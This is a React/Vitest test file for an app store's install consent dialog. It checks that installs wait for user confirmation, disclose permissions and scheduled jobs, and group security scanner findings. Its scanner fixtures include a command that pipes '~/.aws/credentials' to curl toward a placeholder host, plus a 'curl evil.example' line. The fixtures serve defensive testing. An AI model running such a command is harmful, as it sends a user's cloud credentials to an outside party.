// @vitest-environment jsdom
import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'
import { render, screen, fireEvent, waitFor, within, cleanup } from '@testing-library/react'
import type { AppCatalogEntry, AppInstallResult, AppDisclosure } from '../../lib/api'

// ── Every Store install shows what the app gets, and waits ───────────────────────────────
//
// Measured on the real image (72 Store apps): a Store card installed with NO consent screen
// unless the security scanner raised warnings — 50 of 65 installs. Growth Tracker (API reach
// into projects/tasks/knowledge, an agent grant, a daily cron) and Research Lab (an hourly
// background agent) installed in ONE click, and their jobs appeared in `triggers.json`,
// enabled, unseen. The dialog opened only on `isBlockingResult`.
//
// 🔑 NOTHING BUT THE API IS MOCKED. The card, the dialog and the one consent hook are the
// shipped components, so "no install request until confirmed" is a claim about what a click
// on the real card does — not about a stubbed state machine.

const installApp = vi.fn()
const previewApp = vi.fn()

vi.mock('../../lib/api', () => ({
  api: {
    installApp: (...a: unknown[]) => installApp(...a),
    previewApp: (...a: unknown[]) => previewApp(...a),
    removeAppSource: () => Promise.resolve({}),
    addAppSource: () => Promise.resolve({ ok: true, sources: [] }),
    addLocalAppSource: () => Promise.resolve({ ok: true, sources: [] }),
    removeLocalAppSource: () => Promise.resolve({}),
  },
}))
vi.mock('../../app/appSdk', () => ({ notify: vi.fn(), launchChat: vi.fn() }))

// Imported after the mocks so the components bind them.
import { StoreView } from './AppsSection'
import { InstallDialogHarness } from '../../test/installDialogHarness'

const SOURCE = '/apps/growth'
const DIGEST = 'a'.repeat(64)

const DISCLOSURE: AppDisclosure = {
  permissions: { api: ['/api/projects', '/api/tasks', '/api/knowledge'], agent: true, cron: true, storage: true, network: false },
  crons: [{
    name: 'daily-capture', cron_expr: '3 18 * * *', cadence: 'At 06:03 PM', agent: '',
    message: 'scan today and capture growth artifacts', scheduled: true,
  }],
  pythonDependencies: [],
  hasUI: true, uiComponents: '', hasBackend: true, onInstall: 'bash setup.sh', onUpdate: '', mcpServers: [],
    backendSandbox: '', providers: [], onEnable: '', onDisable: '', onUninstall: '',
    cliSetup: '', cliDoctor: '', sources: [], skills: [], runsAsYou: '',
}

const ENTRY: AppCatalogEntry = {
  name: 'growth', displayName: 'Growth Tracker', description: 'evidenced growth artifacts', version: '0.1.0',
  icon: '', author: 'PersonalClaw', source: SOURCE, sourceKind: 'first-party',
  isProvider: false, providerType: '', tags: [], consentKnown: true, ...DISCLOSURE,
}

/** The server's review of a clean-scanning app — the case that used to install unseen. */
function review(over: Partial<AppInstallResult> = {}): AppInstallResult {
  return {
    ok: false, name: 'growth', error: '', needs_consent: true,
    scan: { verdict: 'clean', tier: 'community', findings: [], signature: { state: 'unsigned', signer: '', reason: '' } },
    displayName: 'Growth Tracker', version: '0.1.0', disclosure: DISCLOSURE, previous: null, consent: DIGEST,
    ...over,
  }
}

const toasts: { level: string; message: string }[] = []
const onToast = (e: Event) => { toasts.push((e as CustomEvent).detail) }

beforeEach(() => {
  vi.clearAllMocks()
  toasts.length = 0
  window.addEventListener('ne:toast', onToast)
  previewApp.mockResolvedValue(review())
  installApp.mockResolvedValue({ ok: true, name: 'growth', error: '', needs_consent: false, scan: null, displayName: 'Growth Tracker' })
})
afterEach(() => { window.removeEventListener('ne:toast', onToast); cleanup() })

function grid(entry: AppCatalogEntry = ENTRY, onInstalled = vi.fn()) {
  render(
    <StoreView catalog={{ bundled: [], gitSources: [], localApps: [entry] }}
      result={[{ ...entry, installed: false, enabled: false, hasUI: Boolean(entry.hasUI) }]}
      totalKnown={1} installedCount={0} onInstalled={onInstalled} reloadCatalog={() => {}}
      onClearFilters={() => {}} filtersActive={false} onOpen={() => {}}
      onAction={(() => {}) as never} onOpenSources={() => {}} />,
  )
  return onInstalled
}

/** The card's own Install, then the dialog it opens once the review has come back. */
async function openReview() {
  fireEvent.click(screen.getByRole('button', { name: /^Install$/ }))
  const dialog = await screen.findByRole('dialog')
  await within(dialog).findByTestId('app-disclosure')
  return dialog
}

const text = (el: HTMLElement) => (el.textContent ?? '').replace(/\s+/g, ' ')

describe('a clean-scanning app still asks before it installs', () => {
  it('opens the consent dialog and sends no install request until the user confirms', async () => {
    const onInstalled = grid()
    const dialog = await openReview()

    expect(previewApp).toHaveBeenCalledWith(SOURCE, undefined)
    expect(installApp, 'the card click alone must not install anything').not.toHaveBeenCalled()
    // Titled with the app's display name — "Install growth" named nobody's app.
    expect(within(dialog).getByText('Install Growth Tracker')).toBeTruthy()
    expect(text(dialog)).toMatch(/Nothing is installed until you choose Install/)
    expect(text(dialog)).toMatch(/Permissions the gateway enforces/)
    expect(text(dialog)).toMatch(/API: \/api\/projects, \/api\/tasks, \/api\/knowledge/)
    expect(text(dialog)).toMatch(/Run background agents/)
    expect(text(dialog)).toMatch(/Starts its own server process/)
    expect(text(dialog)).toMatch(/Runs bash setup\.sh in the app's folder during the install/)
    expect(text(dialog)).toMatch(/Security scan: clean/)

    fireEvent.click(within(dialog).getByRole('button', { name: /^Install$/ }))
    await waitFor(() => expect(installApp).toHaveBeenCalledTimes(1))
    // …and it consents to exactly the bytes that were reviewed.
    expect(installApp).toHaveBeenCalledWith(SOURCE, DIGEST)
    await waitFor(() => expect(onInstalled).toHaveBeenCalledWith('growth'))
    expect(screen.queryByRole('dialog'), 'a finished install closes its dialog').toBeNull()
  })

  it('confirms a successful install out loud instead of just making the card vanish', async () => {
    grid()
    const dialog = await openReview()
    fireEvent.click(within(dialog).getByRole('button', { name: /^Install$/ }))
    await waitFor(() => expect(toasts).toContainEqual(expect.objectContaining({ level: 'success', message: 'Installed Growth Tracker.' })))
  })

  it('names the app it installed, not the URL it was installed from', async () => {
    // Install from URL has nothing to title the dialog with but the typed source, and a
    // success that carried no display name toasted "Installed https://…".
    const url = 'https://github.com/acme/apps.git#growth'
    installApp.mockResolvedValueOnce({ ok: true, name: 'growth', error: '', needs_consent: false, scan: null })
    render(<InstallDialogHarness target={{ source: url, label: url }} />)
    await waitFor(() => expect(screen.getByRole('dialog', { name: 'Install Growth Tracker' })).toBeTruthy())
    fireEvent.click(within(screen.getByRole('dialog')).getByRole('button', { name: /^Install$/ }))
    await waitFor(() => expect(toasts).toContainEqual(expect.objectContaining({ level: 'success', message: 'Installed Growth Tracker.' })))
  })

  it('cancel installs nothing', async () => {
    const onInstalled = grid()
    const dialog = await openReview()
    fireEvent.click(within(dialog).getByRole('button', { name: /^Cancel$/ }))
    await waitFor(() => expect(screen.queryByRole('dialog')).toBeNull())
    expect(installApp).not.toHaveBeenCalled()
    expect(onInstalled).not.toHaveBeenCalled()
    expect(toasts).toEqual([])
  })
})

describe('what the dialog discloses is what the app gets', () => {
  it('says out loud that installing turns on its scheduled job', async () => {
    grid()
    const dialog = await openReview()
    const jobs = within(dialog).getByTestId('consent-scheduled-jobs')
    expect(text(jobs)).toMatch(/Installing turns on a scheduled job/)
    expect(text(jobs)).toMatch(/runs an agent on its own, on the schedule below, without asking you first/)
    expect(text(jobs)).toMatch(/pause it on the Triggers page/)
    expect(text(jobs)).toMatch(/daily-capture/)
    expect(text(jobs)).toMatch(/At 06:03 PM/)
  })

  it('discloses a registry listing from the server’s reading of the bytes, not the empty catalog row', async () => {
    // A registry POINTER: the catalog never read its manifest, so it carries no grants at all.
    const pointer: AppCatalogEntry = {
      ...ENTRY, source: '', pointer: 'https://github.com/acme/apps.git#growth', consentKnown: false,
      permissions: {}, crons: [], hasUI: false, hasBackend: false, onInstall: '',
    }
    grid(pointer)
    const dialog = await openReview()
    expect(previewApp).toHaveBeenCalledWith('https://github.com/acme/apps.git#growth', undefined)
    expect(text(dialog)).toMatch(/Run background agents/)
    expect(text(dialog)).toMatch(/Installing turns on a scheduled job/)
  })

  it('shows the new review — and installs nothing — when the app changed after it was reviewed', async () => {
    const changed = review({
      consent: 'b'.repeat(64),
      error: 'install needs consent again: the app changed after it was reviewed',
      disclosure: { ...DISCLOSURE, permissions: { ...DISCLOSURE.permissions, network: true } },
    })
    installApp.mockResolvedValueOnce(changed)
    const onInstalled = grid()
    const dialog = await openReview()
    fireEvent.click(within(dialog).getByRole('button', { name: /^Install$/ }))
    await waitFor(() => expect(text(screen.getByRole('dialog'))).toMatch(/changed after you opened this/))
    expect(onInstalled).not.toHaveBeenCalled()
    expect(toasts).toEqual([])

    fireEvent.click(within(screen.getByRole('dialog')).getByRole('button', { name: /^Install$/ }))
    await waitFor(() => expect(installApp).toHaveBeenLastCalledWith(SOURCE, 'b'.repeat(64)))
  })
})

describe('scanner findings say whether the app can even run them', () => {
  const warned = () => review({
    scan: {
      verdict: 'warning', tier: 'community', signature: { state: 'unsigned', signer: '', reason: '' },
      findings: [
        { surface: 'script', severity: 'warning', rule: 'python_exec', path: 'provider.py',
          evidence: 'L9: subprocess.run(["git", "status"])', reachability: 'not_analysed', runtime: 'loaded', runtime_reason: 'app.json names it' },
        { surface: 'script', severity: 'warning', rule: 'exfil_sensitive_path', path: 'test_provider.py',
          evidence: 'L40: "cat ~/.aws/credentials | curl -d @- https://x"', reachability: 'unreachable',
          reachability_reason: 'inert literal (L1-L5)', runtime: 'untraceable', runtime_reason: 'provider.py can start a program' },
        { surface: 'script', severity: 'warning', rule: 'curl_network', path: 'tests/test_sync.py',
          evidence: 'L12: "curl evil.example"', reachability: 'not_analysed', runtime: 'unloaded',
          runtime_reason: 'nothing the app runs loads this file' },
      ],
    },
  })

  it('labels a test fixture as unreachable test code and keeps the runtime finding prominent', async () => {
    previewApp.mockResolvedValue(warned())
    grid()
    const dialog = await openReview()

    const runs = within(dialog).getByTestId('scan-runs')
    expect(text(runs)).toMatch(/provider\.py/)
    expect(text(runs), 'test files are not presented as what the app runs').not.toMatch(/test_provider\.py|test_sync\.py/)

    const notRun = within(dialog).getByTestId('scan-not-run')
    expect(text(notRun)).toMatch(/2 the app cannot run/)
    expect(text(notRun)).toMatch(/test_provider\.py/)
    expect(text(notRun)).toMatch(/Inert text: the app holds this string, but nothing in it can run it/)
    expect(text(notRun)).toMatch(/tests\/test_sync\.py/)
    expect(text(notRun)).toMatch(/In the app's own tests or fixtures: nothing the app runs loads this file/)
    // A warning still needs the explicit override — grouping never softens the verdict.
    expect(within(dialog).getByRole('button', { name: /Install anyway/ })).toBeTruthy()
  })
})
